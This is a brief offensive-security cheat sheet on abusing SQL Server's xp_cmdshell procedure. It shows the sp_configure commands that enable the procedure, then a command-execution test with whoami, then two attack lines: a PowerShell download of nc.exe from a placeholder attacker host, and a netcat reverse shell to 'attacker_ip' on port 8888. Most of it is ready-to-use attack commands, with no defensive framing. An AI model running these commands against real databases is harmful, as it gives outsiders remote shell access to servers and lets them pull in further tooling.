**`xp_cmdshell`** is a built-in extended stored procedure that lets you execute arbitrary Windows command-line (CMD or PowerShell) commands from within SQL Server, under the context of the SQL Server service account
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```
To enable it 
```
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
Attacker can use it to run commands on server
```
EXEC xp_cmdshell 'whoami';
```

```
-- Download binary
EXEC xp_cmdshell 'powershell wget http://attacker/nc.exe -OutFile C:\Users\Public\nc.exe';
-- Launch reverse shell
EXEC xp_cmdshell 'C:\Users\Public\nc.exe -e cmd.exe attacker_ip 8888';
```

